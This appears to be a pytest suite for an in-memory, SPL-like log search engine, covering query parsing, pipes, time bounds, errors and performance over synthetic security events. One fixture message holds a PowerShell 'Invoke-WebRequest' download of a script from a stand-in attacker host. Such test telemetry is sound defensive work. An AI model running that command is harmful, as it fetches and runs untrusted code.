"""SPL-like search over in-memory events (webui/log_search.py).

Every test uses the fixed NOW below: no wall clock and no local time zone.
"""

import json
import time
from datetime import datetime, timedelta, timezone

import pytest

import log_search as ls
from log_search import SearchError

NOW = datetime(2026, 11, 14, 12, 0, 0, tzinfo=timezone.utc)


def iso(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def ev(eid, ago_s, source, message, **fields):
    return {"id": eid, "time": iso(NOW - timedelta(seconds=ago_s)), "source": source,
            "message": message, "fields": fields}


EVENTS = [
    ev("p1", 300, "powershell", "Invoke-WebRequest http://evil.example/a.ps1", image="powershell.exe", event_id=4104),
    ev("p2", 1200, "powershell", "Get-Process", image="powershell.exe", event_id=4103),
    ev("a1", 120, "access", "GET /api/status", method="GET", path="/api/status", status=200, duration_ms=3.5),
    ev("a2", 600, "access", "POST /api/upload", method="POST", path="/api/upload", status=500, duration_ms=40),
    ev("a3", 1800, "access", "GET /missing", method="GET", path="/missing", status=404, duration_ms=1),
    ev("a4", 90, "access", "GET /odd", method="GET", path="/odd", status="Error"),
    ev("d1", 180, "dns", "query example.com", query="example.com", image="chrome.exe"),
    ev("d2", 170, "dns", "query example.com", query="example.com", image="chrome.exe"),
    ev("d3", 160, "dns", "query example.com", query="example.com", image="chrome.exe"),
    ev("d4", 150, "dns", "query evil.example", query="evil.example", image="a.exe"),
    ev("d5", 140, "dns", "query evil.example", query="evil.example", image="a.exe"),
    ev("d6", 130, "dns", "query foo.test", query="foo.test", image="b.exe"),
    ev("d7", 120, "dns", "query bar.test", query="bar.test", image="b.exe"),
    ev("n1", 80, "netflow", "a.exe -> 10.0.0.1:443", image="a.exe", dst_ip="10.0.0.1", dst_port=443),
    ev("n2", 70, "netflow", "a.exe -> 10.0.0.2:443", image="a.exe", dst_ip="10.0.0.2", dst_port=443),
    ev("n3", 60, "netflow", "a.exe -> 10.0.0.1:80", image="a.exe", dst_ip="10.0.0.1", dst_port=80),
    ev("n4", 50, "netflow", "b.exe -> 10.0.0.9:22", image="b.exe", dst_ip="10.0.0.9", dst_port=22),
    ev("f1", 40, "firewall", "DROP TCP 10.0.0.5 -> 10.0.0.6", action="DROP", protocol="TCP"),
    ev("m1", 30, "mcp", "tdc_status", tool="tdc_status", status=200),
]


def ids(result):
    return [e["id"] for e in result["events"]]


def run(query, events=EVENTS, **kw):
    return ls.run(query, events, NOW, **kw)


def col(result, name):
    i = result["columns"].index(name)
    return [row[i] if isinstance(row, (list, tuple)) else row[name] for row in result["rows"]]


# ---- search part ---------------------------------------------------------------------------


def test_empty_query_returns_everything_newest_first():
    r = run("")
    assert r["type"] == "events"
    assert r["count"] == r["matched"] == len(EVENTS)
    times = [e["time"] for e in r["events"]]
    assert times == sorted(times, reverse=True)
    assert r["columns"] is None and r["truncated"] is False


def test_free_text_is_a_case_insensitive_substring_over_message_and_fields():
    assert set(ids(run("get-proc"))) == {"p2"}
    assert set(ids(run("CHROME"))) == {"d1", "d2", "d3"}
    assert set(ids(run("evil"))) == {"p1", "d4", "d5"}


def test_phrase_and_wildcard():
    assert set(ids(run('"query example"'))) == {"d1", "d2", "d3"}
    assert set(ids(run('"example.com query"'))) == set()
    assert set(ids(run("10.0.0.*:443"))) == {"n1", "n2"}
    assert set(ids(run("get*status"))) == {"a1"}
    assert len(run("*")["events"]) == len(EVENTS)


def test_source_and_its_aliases():
    assert set(ids(run("source=powershell"))) == {"p1", "p2"}
    assert set(ids(run("index=dns"))) == {f"d{i}" for i in range(1, 8)}
    assert set(ids(run("sourcetype=MCP"))) == {"m1"}
    assert set(ids(run("source!=dns source!=access source!=netflow"))) == {"p1", "p2", "f1", "m1"}


def test_field_equality_is_text_wildcard_and_case_insensitive():
    assert set(ids(run("image=CHROME.exe"))) == {"d1", "d2", "d3"}
    assert set(ids(run("image=*.exe image!=powershell.exe query=*test"))) == {"d6", "d7"}
    assert set(ids(run('path="/api/*"'))) == {"a1", "a2"}
    assert set(ids(run("status=404"))) == {"a3"}
    assert set(ids(run("dst_port=443"))) == {"n1", "n2"}


def test_missing_field_never_matches_equals_and_always_matches_not_equals():
    assert "d1" not in ids(run("status=200"))
    assert "d1" in ids(run("status!=200"))
    assert set(ids(run("status=*"))) == {"a1", "a2", "a3", "a4", "m1"}


def test_numeric_comparison_when_both_sides_are_numbers():
    events = [ev("x1", 10, "access", "m", status=200), ev("x2", 20, "access", "m", status=404),
              ev("x3", 30, "access", "m", status=1000), ev("x4", 40, "access", "m", status=99)]
    assert set(ids(run("status>=400", events))) == {"x2", "x3"}  # 1000 > 400 numerically, not as text
    assert set(ids(run("status<400", events))) == {"x1", "x4"}
    assert set(ids(run("status>404", events))) == {"x3"}
    assert set(ids(run("duration_ms>3"))) == {"a1", "a2"}
    assert set(ids(run("duration_ms<=3.5 source=access"))) == {"a1", "a3"}
    assert set(ids(run("dst_port<100"))) == {"n3", "n4"}
    assert set(ids(run("dst_port>9"))) == {"n1", "n2", "n3", "n4"}  # 22 > 9 numerically, not as text


def test_comparison_on_a_text_field_falls_back_to_text():
    assert "a4" in ids(run("status>=400"))  # "error" >= "400" as text
    assert "a4" not in ids(run("status<400"))
    assert set(ids(run("status>=400"))) == {"a2", "a3", "a4"}


def test_numeric_strings_compare_as_numbers():
    events = [ev("x1", 10, "firewall", "p", port="9"), ev("x2", 20, "firewall", "p", port="100")]
    assert ids(run("port>50", events)) == ["x2"]


def test_not_or_and_implicit_and_with_precedence():
    assert set(ids(run("source=dns NOT image=chrome.exe"))) == {"d4", "d5", "d6", "d7"}
    assert set(ids(run("source=powershell OR source=mcp"))) == {"p1", "p2", "m1"}
    # AND binds tighter than OR: a OR (b AND c)
    assert set(ids(run("source=mcp OR source=dns image=b.exe"))) == {"m1", "d6", "d7"}
    assert set(ids(run("(source=mcp OR source=dns) image=b.exe"))) == {"d6", "d7"}
    assert set(ids(run("source=dns AND image=a.exe"))) == {"d4", "d5"}
    assert set(ids(run("NOT (source=dns OR source=access OR source=netflow)"))) == {"p1", "p2", "f1", "m1"}
    assert set(ids(run("NOT NOT source=mcp"))) == {"m1"}


def test_lowercase_and_or_not_are_plain_words():
    events = [ev("x1", 10, "access", "this and that"), ev("x2", 20, "access", "this"),
              ev("x3", 30, "access", "this that")]
    assert ids(run("this and that", events)) == ["x1"]
    assert ids(run('this "AND" that', events)) == ["x1"]
    assert set(ids(run("this AND that", events))) == {"x1", "x3"}
    assert set(ids(run("this or that", events))) == set()  # three plain words
    assert set(ids(run("this OR that", events))) == {"x1", "x2", "x3"}


def test_earliest_and_latest_against_a_fixed_now():
    assert set(ids(run("earliest=-90s source=access"))) == {"a4"}  # a4 is 90 s old, earliest is inclusive
    assert set(ids(run("source=access earliest=-15m"))) == {"a1", "a2", "a4"}
    assert set(ids(run("source=access earliest=-1h latest=-5m"))) == {"a2", "a3"}
    assert set(ids(run("source=access latest=now"))) == {"a1", "a2", "a3", "a4"}
    assert set(ids(run("source=powershell earliest=-1h"))) == {"p1", "p2"}


def test_time_parameters_and_inline_precedence():
    assert set(ids(run("source=access", earliest="-15m"))) == {"a1", "a2", "a4"}
    assert set(ids(run("source=access", earliest="-15m", latest="-5m"))) == {"a2"}
    # inline wins over the parameter
    assert set(ids(run("source=access earliest=-5m", earliest="-1h"))) == {"a1", "a4"}


def test_resolve_time_forms():
    assert ls.resolve_time("now", NOW) == NOW
    assert ls.resolve_time("-15m", NOW) == NOW - timedelta(minutes=15)
    assert ls.resolve_time("-2h", NOW) == NOW - timedelta(hours=2)
    assert ls.resolve_time("-1d", NOW) == NOW - timedelta(days=1)
    assert ls.resolve_time("-1w", NOW) == NOW - timedelta(weeks=1)
    assert ls.resolve_time("-30s", NOW) == NOW - timedelta(seconds=30)
    assert ls.resolve_time("2026-11-14T10:00:00Z", NOW) == datetime(2026, 11, 14, 10, 0, tzinfo=timezone.utc)
    assert ls.resolve_time("2026-11-14T10:00:00.250Z", NOW) == datetime(2026, 11, 14, 10, 0, 0, 250000, tzinfo=timezone.utc)
    assert ls.resolve_time("2026-11-14T12:00:00+02:00", NOW) == datetime(2026, 11, 14, 10, 0, tzinfo=timezone.utc)
    assert ls.resolve_time("2026-11-14", NOW) == datetime(2026, 11, 14, tzinfo=timezone.utc)
    assert ls.resolve_time("2026-11-14T10:00:00", NOW) == datetime(2026, 11, 14, 10, 0, tzinfo=timezone.utc)
    assert ls.resolve_time("-1d", NOW).tzinfo is not None


@pytest.mark.parametrize("bad", ["-xz", "", "15m", "-5y", "2026-13-40", "yesterday"])
def test_resolve_time_rejects_garbage(bad):
    with pytest.raises(SearchError) as e:
        ls.resolve_time(bad, NOW)
    assert e.value.args[0] == f"Invalid time: {bad}"


def test_iso_times_in_the_query_and_fractional_event_times():
    events = [{"id": "x", "time": "2026-11-14T10:00:00.123456Z", "source": "dns", "message": "m", "fields": {}},
              {"id": "y", "time": "2026-11-14T09:59:59Z", "source": "dns", "message": "m", "fields": {}}]
    assert ids(run("earliest=2026-11-14T10:00:00Z", events)) == ["x"]
    assert ids(run("latest=2026-11-14T10:00:00Z", events)) == ["y"]


def test_a_value_with_regex_characters_matches_literally():
    weird = ".+?[](){}|\\^$"
    events = [ev("x1", 10, "powershell", "run " + weird + " now", arg=weird),
              ev("x2", 20, "powershell", "run abc now", arg="abc")]
    assert ids(run('"' + weird + '"', events)) == ["x1"]
    assert ids(run('arg="' + weird + '"', events)) == ["x1"]
    assert ids(run('arg="[a-z]+"', events)) == []
    assert ids(run('".+"', events)) == ["x1"]
    assert ids(run('arg="' + weird[:4] + '*"', events)) == ["x1"]
    assert ids(run('"a.c"', events)) == []  # '.' is not a wildcard
    assert ids(run('"^run"', events)) == []


def test_wildcards_are_matched_without_catastrophic_backtracking():
    events = [ev(f"x{i}", i + 1, "powershell", "a" * 2000 + str(i), arg="a" * 500) for i in range(20)]
    start = time.perf_counter()
    assert ids(run("*a*a*a*a*a*a*a*a*a*a*a*b", events)) == []
    assert ids(run("arg=*a*a*a*a*a*a*a*a*a*a*b", events)) == []
    assert len(ids(run("arg=a*a*a*a", events))) == 20
    assert ids(run("arg=aa*aa*b*", events)) == []
    assert time.perf_counter() - start < 1.0


def test_wildcard_edges():
    events = [ev("x1", 10, "dns", "m", q="abcabc"), ev("x2", 20, "dns", "m", q="abc")]
    assert set(ids(run("q=abc*", events))) == {"x1", "x2"}
    assert set(ids(run("q=*abc", events))) == {"x1", "x2"}
    assert set(ids(run("q=a*c", events))) == {"x1", "x2"}
    assert ids(run("q=abc*abc", events)) == ["x1"]
    assert ids(run("q=*b*c*b*", events)) == ["x1"]
    assert ids(run("q=abcd*", events)) == []
    assert set(ids(run("q=abc*c", events))) == {"x1"}  # the prefix and the suffix may not overlap


def test_quoted_string_with_an_escaped_quote():
    events = [ev("x1", 10, "powershell", 'say "hi" now')]
    assert ids(run(r'"say \"hi\""', events)) == ["x1"]


def test_odd_field_values_do_not_crash():
    events = [ev("x1", 10, "netflow", "m", a=None, b=[1, "x", None, [2]], c=3, d=True, e=1.5, f="")]
    for q in ["a=1", "a!=1", "b=x", "b=2", "b!=x", "c>2", "d=true", "e<2", "f=*", "none", "x1", "a>1 OR b<5"]:
        run(q, events)
    assert ids(run("b=x", events)) == ["x1"]
    assert ids(run("b=2", events)) == ["x1"]
    assert ids(run("d=true", events)) == ["x1"]
    assert ids(run("a=*", events)) == []
    assert ids(run("a!=1", events)) == ["x1"]
    r = run("*", events + [{"id": "bare"}, {"id": "z", "time": "garbage", "source": None, "message": None, "fields": None}])
    assert r["matched"] == len(r["events"])
    run("| stats count dc(b) sum(b) values(b) avg(e) min(a) max(b) by c", events)
    run("| sort b, a | dedup b | table a, b | top b | rare a | timechart count by b", events)


# ---- pipes -----------------------------------------------------------------------------------


def test_stats_count_by_source():
    r = run("| stats count by source")
    assert r["type"] == "table" and r["columns"] == ["source", "count"]
    got = dict(zip(col(r, "source"), col(r, "count")))
    assert got == {"powershell": 2, "access": 4, "dns": 7, "netflow": 4, "firewall": 1, "mcp": 1}
    assert r["matched"] == len(EVENTS) and r["histogram"]["bins"] and r["fields"]
    assert r["events"] == []


def test_stats_without_by_is_one_row_with_default_names():
    r = run("source=access | stats count, avg(duration_ms), min(status), max(duration_ms), sum(duration_ms), dc(method)")
    assert r["columns"] == ["count", "avg(duration_ms)", "min(status)", "max(duration_ms)", "sum(duration_ms)", "dc(method)"]
    assert len(r["rows"]) == 1
    row = dict(zip(r["columns"], r["rows"][0]))
    assert row["count"] == 4
    assert row["sum(duration_ms)"] == pytest.approx(44.5)
    assert row["avg(duration_ms)"] == pytest.approx(44.5 / 3, abs=1e-3)
    assert row["max(duration_ms)"] == 40
    assert row["dc(method)"] == 2


def test_stats_dc_as_by():
    r = run("source=netflow | stats dc(dst_ip) as hosts by image")
    assert r["columns"] == ["image", "hosts"]
    assert dict(zip(col(r, "image"), col(r, "hosts"))) == {"a.exe": 2, "b.exe": 1}


def test_stats_values_is_sorted_and_by_can_take_two_fields():
    r = run("source=netflow | stats values(dst_ip) as ips, count by image, dst_port")
    assert r["columns"] == ["image", "dst_port", "ips", "count"]
    rows = {(row[0], row[1]): row[2:] for row in r["rows"]}
    assert rows[("a.exe", 443)] == [["10.0.0.1", "10.0.0.2"], 2]
    assert rows[("a.exe", 80)] == [["10.0.0.1"], 1] and rows[("b.exe", 22)] == [["10.0.0.9"], 1]
    assert len(rows) == 3
    r = run("source=netflow | stats values(dst_ip) as ips")
    assert r["rows"][0][0] == ["10.0.0.1", "10.0.0.2", "10.0.0.9"]


def test_stats_values_is_limited_to_100():
    events = [ev(f"x{i}", i + 1, "dns", "m", q=f"v{i:04d}") for i in range(250)]
    r = run("| stats values(q) as q", events)
    assert len(r["rows"][0][0]) == 100 and r["rows"][0][0] == sorted(r["rows"][0][0])


def test_stats_on_nothing_still_returns_the_count_row():
    r = run("source=nope | stats count")
    assert r["rows"] == [[0]]


def test_top_and_rare():
    r = run("| top 3 query")
    assert r["type"] == "table" and r["columns"] == ["query", "count", "percent"]
    assert r["rows"][0][:2] == ["example.com", 3]
    assert r["rows"][1][:2] == ["evil.example", 2]
    assert len(r["rows"]) == 3
    assert r["rows"][0][2] == pytest.approx(100 * 3 / 7, abs=0.01)
    r = run("| rare 2 query")
    assert [row[1] for row in r["rows"]] == [1, 1]
    assert r["rows"][0][0] == "bar.test"
    assert len(run("| top query")["rows"]) == 4
    assert len(run("| top image")["rows"]) <= 10


def test_sort_head_tail():
    r = run("| stats count by source | sort -count | head 2")
    assert r["type"] == "table"
    assert col(r, "source") == ["dns", "access"] and col(r, "count") == [7, 4]
    r = run("| stats count by source | sort count, source | head 3")
    assert col(r, "source") == ["firewall", "mcp", "powershell"]
    assert run("| head 3")["count"] == 3 and len(run("| head 3")["events"]) == 3
    assert ids(run("source=dns | sort time | head 1")) == ["d1"]
    assert ids(run("source=dns | sort -time | head 1")) == ["d7"]
    assert ids(run("source=dns | tail 1")) == ["d1"]  # newest-first order, the last one is the oldest
    assert ids(run("source=dns | head 2")) == ["d7", "d6"]
    assert ids(run("source=access | sort -status | head 2")) == ["a4", "a2"]  # text sorts after numbers
    assert ids(run("source=access | sort status | head 2")) == ["a1", "a3"]
    assert ids(run("source=access | sort +duration_ms | head 1")) == ["a3"]


def test_sort_puts_missing_values_last_in_both_directions():
    assert ids(run("source=access | sort duration_ms"))[-1] == "a4"
    assert ids(run("source=access | sort -duration_ms"))[-1] == "a4"


def test_table_and_fields():
    r = run("source=mcp | table time, source, message")
    assert r["type"] == "table" and r["columns"] == ["time", "source", "message"]
    assert r["rows"] == [[iso(NOW - timedelta(seconds=30)), "mcp", "tdc_status"]]
    r = run("source=dns | table image, query, nothing | head 1")
    assert r["columns"] == ["image", "query", "nothing"] and r["rows"][0][2] is None
    r = run("source=access | fields path, status")
    assert r["type"] == "table" and r["columns"] == ["path", "status"] and len(r["rows"]) == 4


def test_dedup():
    r = run("source=netflow | dedup dst_ip")
    assert sorted(ids(r)) == ["n2", "n3", "n4"]  # the newest event of each address wins
    assert r["count"] == 3 and r["type"] == "events"
    assert len(run("source=dns | dedup image, query")["events"]) == 4
    assert len(run("| dedup query")["events"]) == 4  # events without the field are dropped


def test_timechart_by_source():
    events = [ev("x1", 50, "dns", "m"), ev("x2", 10, "dns", "m"), ev("x3", 40, "access", "m"),
              ev("x4", 125, "access", "m"), ev("x5", 130, "dns", "m")]
    r = ls.run("| timechart span=1m count by source", events, NOW)
    assert r["type"] == "timechart"
    assert r["columns"][0] == "_time" and set(r["columns"][1:]) == {"dns", "access"}
    rows = {row[0]: dict(zip(r["columns"][1:], row[1:])) for row in r["rows"]}
    assert rows["2026-11-14T11:57:00Z"] == {"dns": 1, "access": 1}
    assert rows["2026-11-14T11:58:00Z"] == {"dns": 0, "access": 0}
    assert rows["2026-11-14T11:59:00Z"] == {"dns": 2, "access": 1}
    assert len(rows) == 3
    assert r["matched"] == 5


def test_timechart_without_by_and_with_the_other_units():
    events = [ev("x1", 50, "dns", "m"), ev("x2", 10, "dns", "m"), ev("x3", 7300, "dns", "m")]
    r = ls.run("| timechart span=1h count", events, NOW)
    assert r["columns"] == ["_time", "count"]
    assert [row[1] for row in r["rows"]] == [1, 0, 2]
    assert sum(row[1] for row in ls.run("| timechart span=30s count", events, NOW)["rows"]) == 3
    assert sum(row[1] for row in ls.run("| timechart span=1d count", events, NOW)["rows"]) == 3
    auto = ls.run("| timechart count by source", EVENTS, NOW)
    assert auto["type"] == "timechart" and len(auto["rows"]) <= 70


def test_timechart_range_follows_earliest_and_latest():
    events = [ev("x1", 50, "dns", "m")]
    r = ls.run("earliest=-5m | timechart span=1m count", events, NOW)
    assert len(r["rows"]) >= 5


def test_pipe_after_timechart_and_table_keep_working():
    r = run("| timechart span=1m count | head 2")
    assert r["type"] == "timechart" and len(r["rows"]) == 2
    r = run("| timechart span=1m count | table count")
    assert r["type"] == "table" and r["columns"] == ["count"]


# ---- result schema ---------------------------------------------------------------------------


def test_histogram_bins_sum_to_matched():
    r = run("")
    h = r["histogram"]
    assert 1 <= len(h["bins"]) <= 70 and h["span_s"] >= 1
    assert sum(sum(b["counts"].values()) for b in h["bins"]) == r["matched"] == len(EVENTS)
    assert all({"start", "end", "counts"} <= set(b) for b in h["bins"])
    assert h["bins"][0]["start"] <= h["bins"][0]["end"]
    r = run("source=dns earliest=-1h")
    assert sum(sum(b["counts"].values()) for b in r["histogram"]["bins"]) == 7
    assert set().union(*[set(b["counts"]) for b in r["histogram"]["bins"]]) == {"dns"}
    assert r["histogram"]["bins"][0]["start"] <= iso(NOW - timedelta(hours=1))


def test_histogram_with_no_matches():
    r = run("nothing-like-this")
    assert r["matched"] == 0 and r["events"] == [] and r["count"] == 0
    assert r["histogram"]["bins"] == [] and r["fields"] == []


def test_fields_sidebar_has_counts_and_top_10_values():
    events = [ev(f"x{i}", i + 1, "access", "m", path=f"/p{i % 15}", status=200 if i % 2 else 404) for i in range(60)]
    r = ls.run("", events, NOW)
    by_name = {f["name"]: f for f in r["fields"]}
    assert by_name["status"]["count"] == 60
    assert [(v["value"], v["count"]) for v in by_name["status"]["top"]] == [("200", 30), ("404", 30)]
    assert len(by_name["path"]["top"]) == 10
    assert by_name["path"]["top"][0]["count"] == 4
    assert by_name["source"]["top"] == [{"value": "access", "count": 60}]
    assert "message" not in by_name and "time" not in by_name
    names = [f["name"] for f in r["fields"]]
    assert names == sorted(names, key=lambda n: (-by_name[n]["count"], n))


def test_fields_sidebar_refers_to_the_matches_before_the_pipes():
    r = run("source=dns | stats count")
    names = {f["name"] for f in r["fields"]}
    assert {"query", "image", "source"} <= names


def test_max_rows_sets_truncated():
    events = [ev(f"x{i}", i + 1, "dns", "m", q=str(i)) for i in range(50)]
    r = ls.run("", events, NOW, max_rows=10)
    assert len(r["events"]) == 10 and r["count"] == 50 and r["matched"] == 50 and r["truncated"] is True
    assert [e["id"] for e in r["events"]] == [f"x{i}" for i in range(10)]
    r = ls.run("| stats count by q", events, NOW, max_rows=10)
    assert len(r["rows"]) == 10 and r["truncated"] is True and r["count"] == 50
    assert ls.run("", events, NOW, max_rows=50)["truncated"] is False


def test_max_matches_caps_what_goes_into_the_pipes():
    events = [ev(f"x{i}", i + 1, "dns", "m") for i in range(50)]
    r = ls.run("| stats count", events, NOW, max_matches=20)
    assert r["rows"] == [[20]] and r["truncated"] is True and r["matched"] == 50
    r = ls.run("| stats count", events, NOW, max_matches=50)
    assert r["rows"] == [[50]] and r["truncated"] is False


def test_run_does_not_modify_the_events():
    import copy
    before = copy.deepcopy(EVENTS)
    run("source=dns | sort -time | dedup query | table query")
    run("")
    assert EVENTS == before


# ---- errors ----------------------------------------------------------------------------------


@pytest.mark.parametrize("query,message,pos", [
    ("(a", "Unbalanced parenthesis", 0),
    ("a)", "Unbalanced parenthesis", 1),
    ("(a OR (b)", "Unbalanced parenthesis", 0),
    ("| stats", "Expected a function after stats", 7),
    ("source=dns | stats by source", "Expected a function after stats", 19),
    ("| foo", "Unknown command: foo", 2),
    ("a | b", "Unknown command: b", 4),
    ("earliest=-xz", "Invalid time: -xz", 9),
    ("a latest=tomorrow", "Invalid time: tomorrow", 9),
    ("a |", "Expected a command after |", 3),
])
def test_syntax_errors_carry_text_and_position(query, message, pos):
    with pytest.raises(SearchError) as e:
        ls.parse(query)
    assert e.value.args[0] == message and str(e.value) == message
    assert e.value.pos == pos


def test_errors_surface_from_run_as_well():
    for q, msg in [("(a", "Unbalanced parenthesis"), ("| foo", "Unknown command: foo"),
                   ("| stats", "Expected a function after stats"), ("earliest=-xz", "Invalid time: -xz")]:
        with pytest.raises(SearchError) as e:
            run(q)
        assert e.value.args[0] == msg
    with pytest.raises(SearchError) as e:
        run("a", earliest="bogus")
    assert e.value.args[0] == "Invalid time: bogus"


def test_query_length_limit():
    ls.parse("a" * 4000)
    with pytest.raises(SearchError) as e:
        ls.parse("a" * 4001)
    assert e.value.args[0] == "Query too long"
    assert isinstance(e.value.pos, int)
    with pytest.raises(SearchError):
        run("a " * 2001)


@pytest.mark.parametrize("query", [
    "a AND", "a OR", "NOT", "a OR | head 1", "()", "status>=", "status=", 'a "unterminated', "| head x",
    "| sort", "| dedup", "| table", "| top", "| stats count(", "| stats sum()", "| stats count as",
    "| stats bogus(a)", "| timechart", "| timechart span=5x count", "| head 1 2", "= a", "a = = b",
])
def test_other_malformed_queries_are_search_errors_not_crashes(query):
    with pytest.raises(SearchError) as e:
        ls.parse(query)
    assert isinstance(e.value.pos, int) and 0 <= e.value.pos <= len(query)


def test_too_many_time_buckets_is_an_error():
    with pytest.raises(SearchError):
        run("| timechart span=1s count", [ev("x1", 10, "dns", "m"), ev("x2", 10 + 86400 * 30, "dns", "m")])


# ---- robustness: nesting, huge numbers, extreme times -------------------------------------


def _strict_json(result):
    json.dumps(result, allow_nan=False)


@pytest.mark.parametrize("query", ["(" * 300, "(" * 300 + "a" + ")" * 300, "NOT " * 900 + "a",
                                   "(" * 60 + "a" + ")" * 60, "(NOT " * 30 + "a" + ")" * 30],
                         ids=["open-300", "balanced-300", "not-1000", "paren-60", "paren-not-30"])
def test_deep_nesting_is_a_search_error_not_a_recursion_error(query):
    with pytest.raises(SearchError) as e:
        run(query)
    assert e.value.args[0] == "Query too nested" and 0 <= e.value.pos <= len(query)
    with pytest.raises(SearchError):
        ls.parse(query)


def test_reasonable_nesting_still_works():
    assert len(run("(" * 20 + "source=dns" + ")" * 20)["events"]) == 7
    assert len(run("NOT " * 21 + "source=dns")["events"]) == len(EVENTS) - 7
    assert len(run("zzz OR " * 500 + "evil")["events"]) == 3


BIG_EVENTS = [ev("b1", 10, "dns", "m", c="1e999", d=10 ** 400, e=1e308, f="x", g=3),
              ev("b2", 20, "dns", "m", c="1e999", d=10 ** 400 + 1, e=1e308, f="y", g=4)]


@pytest.mark.parametrize("query", [
    "c>5", "c=5", "d>5", "d=5", "d<=1e9", "g<d", "e>1", "| sort c", "| sort -d", "| sort d, e",
    "| stats sum(c)", "| stats max(c), min(c), avg(c), dc(c), values(c)", "| stats sum(d)", "| stats avg(d), max(d)",
    "| stats sum(e)", "| stats avg(e)", "| stats sum(e) by f", "| stats avg(e), min(e), max(e) by f",
    "| top d", "| table c, d, e", "| dedup d | stats sum(g)", "c=1e999", "d>1e999",
])
def test_huge_numbers_never_crash_or_leak_inf_and_nan(query):
    r = run(query, BIG_EVENTS)
    _strict_json({k: v for k, v in r.items() if k != "events"})


def test_huge_number_semantics():
    assert ls._num("1e999") is None and ls._num(10 ** 400) is None and ls._num(float("inf")) is None
    assert ls._num("1e308") == 1e308
    r = run("| stats sum(e) as s, avg(e) as a, max(e) as m", BIG_EVENTS)
    row = dict(zip(r["columns"], r["rows"][0]))
    assert row["s"] is None and row["a"] is None and row["m"] == 1e308
    assert run("| stats sum(c)", BIG_EVENTS)["rows"] == [[None]]
    assert len(run("c=1e999", BIG_EVENTS)["events"]) == 2  # text equality
    assert ids(run("g<5", BIG_EVENTS)) == ["b1", "b2"]


@pytest.mark.parametrize("value", ["1960-01-01", "1969-12-31T23:59:59Z", "-999999999w", "-5000w", "-99999999999d",
                                   "0001-01-01", "9999-12-31T23:59:59-05:00", "+999999999w"])
def test_times_outside_1970_to_9999_are_invalid(value):
    for q in (f"earliest={value}", f"latest={value}"):
        with pytest.raises(SearchError) as e:
            run(q)
        assert e.value.args[0] == f"Invalid time: {value}"
    with pytest.raises(SearchError) as e:
        run("a", earliest=value)
    assert e.value.args[0] == f"Invalid time: {value}"
    with pytest.raises(SearchError):
        ls.resolve_time(value, NOW)


def test_times_at_the_edges_of_the_range_are_fine():
    assert ls.resolve_time("1970-01-01", NOW).year == 1970
    assert ls.resolve_time("9999-12-31T23:59:59Z", NOW).year == 9999
    r = run("earliest=1970-01-01 latest=9999-12-31T23:59:59Z | timechart count", EVENTS)
    assert r["type"] == "timechart" and len(r["rows"]) <= 1000
    _strict_json(r)
    h = run("earliest=1970-01-01", EVENTS)["histogram"]
    assert 1 <= len(h["bins"]) <= 70 and h["bins"][0]["start"] == "1970-01-01T00:00:00Z"
    h = run("latest=9999-12-31", EVENTS)["histogram"]
    assert 1 <= len(h["bins"]) <= 70 and h["bins"][-1]["end"] <= "9999-12-31T23:59:59Z"


def test_events_with_out_of_range_times_are_handled():
    events = [{"id": "old", "time": "1960-05-05T00:00:00Z", "source": "dns", "message": "m", "fields": {}},
              {"id": "far", "time": "9999-12-31T23:59:59Z", "source": "dns", "message": "m", "fields": {}},
              {"id": "ok", "time": "2026-11-14T11:59:00Z", "source": "dns", "message": "m", "fields": {}}]
    for q in ["", "| timechart count", "| stats count by source", "| timechart count by source"]:
        _strict_json(run(q, events))
    with pytest.raises(SearchError):
        run("| timechart span=1d count", events)  # 8000 years of daily buckets
    assert ids(run("", events))[0] in ("far", "ok")


def test_timechart_bins_are_bounded():
    events = [ev("x1", 10, "dns", "m"), ev("x2", 10 + 86400 * 365, "dns", "m")]
    for q in ("| timechart span=1s count", "| timechart span=1m count", "| timechart span=5m count by source"):
        with pytest.raises(SearchError) as e:
            run(q, events)
        assert e.value.args[0] == "Too many time buckets; use a larger span"
    r = run("| timechart span=1d count", events)
    assert 360 <= len(r["rows"]) <= 1000
    r = run("| timechart count", events)
    assert len(r["rows"]) <= 100
    _strict_json(r)


# ---- AST -------------------------------------------------------------------------------------


def test_parse_exposes_pipes_and_time_bounds():
    q = ls.parse("a earliest=-15m latest=now | stats count by source | head 5")
    assert q.earliest == "-15m" and q.latest == "now"
    assert [p.name for p in q.pipes] == ["stats", "head"]
    assert q.terms is not None
    assert ls.parse("| head 1").terms is None
    assert ls.parse("").pipes == []


# ---- performance -----------------------------------------------------------------------------


def _big():
    events = []
    base = NOW - timedelta(hours=20)
    sources = ["powershell", "access", "mcp", "netflow", "dns", "firewall"]
    for i in range(50000):
        events.append({"id": str(i), "time": iso(base + timedelta(seconds=i * 1.3)), "source": sources[i % 6],
                       "message": f"event number {i} from host-{i % 97}",
                       "fields": {"status": 200 + (i % 5) * 100, "path": f"/api/{i % 40}", "image": f"p{i % 13}.exe",
                                  "dst_ip": f"10.0.{i % 200}.{i % 250}", "client": "browser", "method": "GET"}})
    return events


def test_fifty_thousand_events_search_fast():
    events = _big()
    for q in ["source=dns status>=400", "host-5", "status=500 AND image=p3.exe", "NOT source=mcp path=/api/1*",
              "| stats count by source", "earliest=-2h | top 5 path", "| timechart span=10m count by source"]:
        start = time.perf_counter()
        r = ls.run(q, events, NOW)
        took = time.perf_counter() - start
        assert r["matched"] > 0
        assert took < 1.0, (q, took)
